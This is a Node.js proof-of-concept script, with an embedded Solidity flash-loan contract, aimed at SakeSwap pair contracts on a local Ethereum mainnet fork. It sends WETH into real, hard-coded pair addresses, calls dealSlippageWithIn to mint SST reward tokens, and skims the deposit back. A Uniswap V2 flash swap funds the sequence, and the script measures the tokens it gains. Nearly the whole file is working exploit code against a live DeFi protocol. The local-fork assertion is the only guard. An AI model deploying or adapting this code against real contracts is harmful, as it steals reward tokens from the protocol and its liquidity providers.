const assert = require('node:assert/strict');
const { Contract, ContractFactory, Interface, JsonRpcProvider, keccak256 } = require('ethers');
const solc = require('solc');

const FORK_RPC = process.env.FORK_RPC_URL || 'http://127.0.0.1:8545';
const GECKO_POOLS = 'https://api.geckoterminal.com/api/v2/networks/eth/dexes/sakeswap/pools?page=';
const SAKE_FACTORY = '0x75e48C954594d64ef9613AeEF97Ad85370F13807';
const WETH = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const UNISWAP_V2_FACTORY = '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f';
const WETH_PAIR_ABI = [
  'function token0() view returns(address)',
  'function token1() view returns(address)',
  'function getReserves() view returns(uint112,uint112,uint32)',
  'function swap(uint amount0Out,uint amount1Out,address to,bytes data)',
];
const SAKE_PAIR_ABI = [
  'function token0() view returns(address)',
  'function token1() view returns(address)',
  'function factory() view returns(address)',
  'function stoken() view returns(address)',
  'function getReserves() view returns(uint112,uint112,uint32)',
  'function dealSlippageWithIn(address[] path,uint256 amountIn,address to,bool ifmint) returns(uint256)',
  'function dealSlippageWithOut(address[] path,uint256 amountOut,address to,bool ifmint) returns(uint256)',
  'function getAmountInFinal(address token,uint256 amountOut) view returns(uint256,uint256)',
  'function skim(address to)',
];
const ERC20_ABI = ['function balanceOf(address) view returns(uint256)'];
const WETH_ABI = [
  ...ERC20_ABI,
  'function deposit() payable',
  'function transfer(address,uint256) returns(bool)',
];

const FLASH_BORROWER_SOURCE = `
pragma solidity ^0.8.15;

interface IERC20Probe {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IV2PairProbe {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ISakePairProbe {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function stoken() external view returns (address);
    function dealSlippageWithIn(address[] calldata path, uint256 amountIn, address to, bool ifmint) external returns (uint256);
    function skim(address to) external;
}

contract SakeFlashBorrowerProbe {
    address public immutable provider;
    address public immutable target;
    address public immutable weth;
    address public immutable otherToken;

    constructor(address provider_, address target_, address weth_, address otherToken_) {
        provider = provider_;
        target = target_;
        weth = weth_;
        otherToken = otherToken_;
    }

    function execute(uint256 amount) external {
        address token0 = IV2PairProbe(provider).token0();
        address token1 = IV2PairProbe(provider).token1();
        require(token0 == weth || token1 == weth, "provider has no WETH");
        IV2PairProbe(provider).swap(token0 == weth ? amount : 0, token1 == weth ? amount : 0, address(this), abi.encode(amount));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == provider && sender == address(this), "provider only");
        uint256 borrowed = amount0 + amount1;
        require(IERC20Probe(weth).transfer(target, borrowed), "WETH transfer failed");
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = otherToken;
        ISakePairProbe(target).dealSlippageWithIn(path, borrowed, address(this), true);
        ISakePairProbe(target).skim(address(this));
        uint256 repayment = (borrowed * 1000) / 997 + 1;
        require(IERC20Probe(weth).transfer(provider, repayment), "repayment failed");
    }
}
`;

async function fetchPools() {
  const pools = [];
  for (let page = 1; page <= 10; page += 1) {
    let response;
    for (let attempt = 0; attempt < 6; attempt += 1) {
      response = await fetch(`${GECKO_POOLS}${page}`);
      if (response.ok) break;
      await new Promise((resolve) => setTimeout(resolve, 500 * (attempt + 1)));
    }
    assert.ok(response && response.ok, `GeckoTerminal pool page ${page} failed: ${response && response.status}`);
    const payload = await response.json();
    if (!payload.data || payload.data.length === 0) break;
    pools.push(...payload.data);
    if (payload.data.length < 20) break;
  }
  return pools;
}

function compileBorrower() {
  assert.match(solc.version(), /^0\.8\./, 'set NODE_PATH to a Solidity 0.8 compiler');
  const input = {
    language: 'Solidity',
    sources: { 'SakeFlashBorrowerProbe.sol': { content: FLASH_BORROWER_SOURCE } },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      evmVersion: 'london',
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((entry) => entry.severity === 'error');
  assert.deepEqual(errors, [], errors.map((entry) => entry.formattedMessage).join('\n'));
  return output.contracts['SakeFlashBorrowerProbe.sol'].SakeFlashBorrowerProbe;
}

async function main() {
  assert.match(FORK_RPC, /127\.0\.0\.1|localhost/, 'transactions must target a local fork');
  const provider = new JsonRpcProvider(FORK_RPC);
  assert.equal((await provider.getNetwork()).chainId, 1n, 'fork must retain Ethereum mainnet chain id');
  const forkBlock = await provider.getBlockNumber();
  const signer = await provider.getSigner(0);
  const recipient = await signer.getAddress();
  const pools = await fetchPools();
  assert.ok(pools.length > 0, 'GeckoTerminal returned no SakeSwap pools');

  const results = [];
  const wethPools = [];
  for (const listing of pools) {
    const address = listing.attributes.address;
    const pair = new Contract(address, SAKE_PAIR_ABI, signer);
    const runtime = await provider.send('eth_getCode', [address, 'latest']);
    assert.notEqual(runtime, '0x', `${listing.attributes.name} has no code on the fork`);
    const [factory, token0, token1, reserves, stokenAddress] = await Promise.all([
      pair.factory(), pair.token0(), pair.token1(), pair.getReserves(), pair.stoken(),
    ]);
    assert.equal(factory.toLowerCase(), SAKE_FACTORY.toLowerCase(), `${address} is not from the SakeSwap factory`);
    const [reserve0, reserve1] = reserves.slice(0, 2).map(BigInt);
    const entry = {
      name: listing.attributes.name,
      address,
      token0,
      token1,
      reserve0: reserve0.toString(),
      reserve1: reserve1.toString(),
      runtimeBytes: (runtime.length - 2) / 2,
      runtimeHash: keccak256(runtime),
      withOut: 'not-tested',
      withIn: 'not-applicable',
    };

    if (reserve0 === 0n || reserve1 === 0n) {
      entry.withOut = 'skipped-empty-reserves';
      entry.withIn = 'skipped-empty-reserves';
      results.push(entry);
      continue;
    }

    const poolSnapshot = await provider.send('evm_snapshot', []);
    const stoken = new Contract(stokenAddress, ERC20_ABI, provider);
    const token0Contract = new Contract(token0, ERC20_ABI, provider);
    const token1Contract = new Contract(token1, ERC20_ABI, provider);
    const [balance0BeforeOut, balance1BeforeOut] = await Promise.all([
      token0Contract.balanceOf(address), token1Contract.balanceOf(address),
    ]);
    const stokenBeforeOut = await stoken.balanceOf(recipient);
    let selectedOut;
    for (const [input, output, reserveOut] of [
      [token0, token1, reserve1],
      [token1, token0, reserve0],
    ]) {
      const amountOut = reserveOut / 4n;
      if (amountOut === 0n) continue;
      try {
        const quote = await pair.getAmountInFinal(output, amountOut);
        if (quote[1] > 0n) {
          await pair.dealSlippageWithOut.staticCall([input, output], amountOut, recipient, true);
          selectedOut = { input, output, amountOut, expectedMint: quote[1] };
          break;
        }
      } catch {}
    }
    if (selectedOut) {
      await (await pair.dealSlippageWithOut(
        [selectedOut.input, selectedOut.output], selectedOut.amountOut, recipient, true,
      )).wait();
      const stokenAfterOut = await stoken.balanceOf(recipient);
      assert.equal(stokenAfterOut - stokenBeforeOut, selectedOut.expectedMint, `${address} exact-output helper mint mismatch`);
      entry.withOut = `minted:${(stokenAfterOut - stokenBeforeOut).toString()}`;
    } else {
      entry.withOut = 'no-positive-valid-quote';
    }
    const reservesAfterOut = (await pair.getReserves()).slice(0, 2).map(BigInt);
    assert.deepEqual(reservesAfterOut, [reserve0, reserve1], `${address} exact-output helper changed reserves`);
    assert.equal(await token0Contract.balanceOf(address), balance0BeforeOut, `${address} exact-output helper changed token0 balance`);
    assert.equal(await token1Contract.balanceOf(address), balance1BeforeOut, `${address} exact-output helper changed token1 balance`);

    const wethIs0 = token0.toLowerCase() === WETH.toLowerCase();
    const wethIs1 = token1.toLowerCase() === WETH.toLowerCase();
    if (wethIs0 || wethIs1) {
      const inputReserve = wethIs0 ? reserve0 : reserve1;
      const donation = inputReserve / 20n;
      if (donation === 0n) {
        entry.withIn = 'skipped-dust-weth-reserve';
      } else {
        const [balance0Before, balance1Before] = await Promise.all([
          token0Contract.balanceOf(address), token1Contract.balanceOf(address),
        ]);
        if (balance0Before !== reserve0 || balance1Before !== reserve1) {
          entry.withIn = 'skipped-preexisting-balance-surplus';
        } else {
          const weth = new Contract(WETH, WETH_ABI, signer);
          const signerWethBefore = await weth.balanceOf(recipient);
          await (await weth.deposit({ value: donation })).wait();
          const signerWethAfterDeposit = await weth.balanceOf(recipient);
          await (await weth.transfer(address, donation)).wait();
          const path = wethIs0 ? [token0, token1] : [token1, token0];
          const stokenBeforeIn = await stoken.balanceOf(recipient);
          await pair.dealSlippageWithIn.staticCall(path, donation, recipient, true);
          await (await pair.dealSlippageWithIn(path, donation, recipient, true)).wait();
          const stokenAfterIn = await stoken.balanceOf(recipient);
          assert.ok(stokenAfterIn > stokenBeforeIn, `${address} donated-input helper did not mint SST`);
          assert.equal(signerWethAfterDeposit, signerWethBefore + donation);
          let skimError;
          let skimFailure;
          try {
            await (await pair.skim(recipient)).wait();
          } catch (error) {
            skimFailure = error;
            skimError = error.shortMessage || error.message;
          }
          if (skimError) {
            const detail = skimFailure.info?.error?.message || skimError;
            entry.withIn = `minted:${(stokenAfterIn - stokenBeforeIn).toString()},skim-reverted:${detail}`;
          } else {
            assert.equal(await weth.balanceOf(recipient), signerWethAfterDeposit, `${address} did not return the full WETH donation`);
            const [reserve0After, reserve1After] = (await pair.getReserves()).slice(0, 2).map(BigInt);
            assert.equal(reserve0After, reserve0, `${address} token0 reserve changed`);
            assert.equal(reserve1After, reserve1, `${address} token1 reserve changed`);
            entry.withIn = `minted:${(stokenAfterIn - stokenBeforeIn).toString()},skim-recovered:${donation.toString()}`;
          }
        }
      }
      wethPools.push(entry);
    }
    results.push(entry);
    assert.equal(await provider.send('evm_revert', [poolSnapshot]), true, `${address} fork snapshot rollback failed`);
  }

  const runtimeHashes = new Set(results.map((entry) => entry.runtimeHash));
  assert.equal(runtimeHashes.size, 1, 'GeckoTerminal pools do not all use the same pair runtime');

  const targetAddress = '0xe2e5aca8e483a4c057892ee1f03bebc9bfa1f9c2';
  const providerFactory = new Contract(UNISWAP_V2_FACTORY, ['function getPair(address,address) view returns(address)'], provider);
  const flashPairAddress = await providerFactory.getPair(WETH, USDT);
  assert.notEqual(flashPairAddress, '0x0000000000000000000000000000000000000000', 'no Uniswap V2 WETH/USDT flash pair found');
  assert.notEqual((await provider.getCode(flashPairAddress)), '0x', 'flash provider has no code on the fork');
  const flashPair = new Contract(flashPairAddress, WETH_PAIR_ABI, provider);
  const [flashToken0, flashToken1, flashReserves] = await Promise.all([
    flashPair.token0(), flashPair.token1(), flashPair.getReserves(),
  ]);
  assert.ok([flashToken0.toLowerCase(), flashToken1.toLowerCase()].includes(WETH.toLowerCase()));
  const wethReserve = flashToken0.toLowerCase() === WETH.toLowerCase() ? BigInt(flashReserves[0]) : BigInt(flashReserves[1]);
  const flashAmount = 5n * 10n ** 16n;
  assert.ok(wethReserve > flashAmount, 'flash pair has insufficient WETH liquidity');

  const target = new Contract(targetAddress, SAKE_PAIR_ABI, provider);
  const targetToken0 = await target.token0();
  const targetToken1 = await target.token1();
  assert.ok([targetToken0.toLowerCase(), targetToken1.toLowerCase()].includes(WETH.toLowerCase()));
  const otherToken = targetToken0.toLowerCase() === WETH.toLowerCase() ? targetToken1 : targetToken0;
  const artifact = compileBorrower();
  const flashSnapshot = await provider.send('evm_snapshot', []);
  const borrower = await new ContractFactory(artifact.abi, `0x${artifact.evm.bytecode.object}`, signer)
    .deploy(flashPairAddress, targetAddress, WETH, otherToken, { gasLimit: 2_000_000 });
  await borrower.waitForDeployment();
  const borrowerAddress = await borrower.getAddress();
  const weth = new Contract(WETH, WETH_ABI, signer);
  const feeSeed = 10n ** 16n;
  await (await weth.deposit({ value: feeSeed })).wait();
  await (await weth.transfer(borrowerAddress, feeSeed)).wait();
  const targetStoken = new Contract(await target.stoken(), ERC20_ABI, provider);
  const stokenBeforeFlash = await targetStoken.balanceOf(borrowerAddress);
  const borrowerWethBefore = await weth.balanceOf(borrowerAddress);
  await (await borrower.execute(flashAmount, { gasLimit: 1_500_000 })).wait();
  const stokenAfterFlash = await targetStoken.balanceOf(borrowerAddress);
  const borrowerWethAfter = await weth.balanceOf(borrowerAddress);
  assert.ok(stokenAfterFlash > stokenBeforeFlash, 'flash-funded helper sequence did not mint SST');
  assert.equal(borrowerWethBefore - borrowerWethAfter, (flashAmount * 1000n) / 997n + 1n - flashAmount);

  const flashSSTMinted = stokenAfterFlash - stokenBeforeFlash;
  const flashFeePaid = borrowerWethBefore - borrowerWethAfter;
  assert.equal(await provider.send('evm_revert', [flashSnapshot]), true, 'flash scenario snapshot rollback failed');

  console.log('PASS: current GeckoTerminal SakeSwap pools were tested against forked Ethereum pair bytecode.');
  console.log('PASS: Uniswap V2 flash swap funded the SakeSwap donation; skim recovered it and the callback repaid the provider.');
  console.log(JSON.stringify({
    forkBlock,
    geckoPools: pools.length,
    poolsWithActiveReserves: results.filter((x) => x.withOut !== 'skipped-empty-reserves').length,
    distinctPairRuntimeHashes: runtimeHashes.size,
    pairRuntimeHash: [...runtimeHashes][0],
    results,
    flashProvider: flashPairAddress,
    flashProviderFactory: UNISWAP_V2_FACTORY,
    targetPair: targetAddress,
    flashAmount: flashAmount.toString(),
    flashSSTMinted: flashSSTMinted.toString(),
    flashFeePaid: flashFeePaid.toString(),
  }, null, 2));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
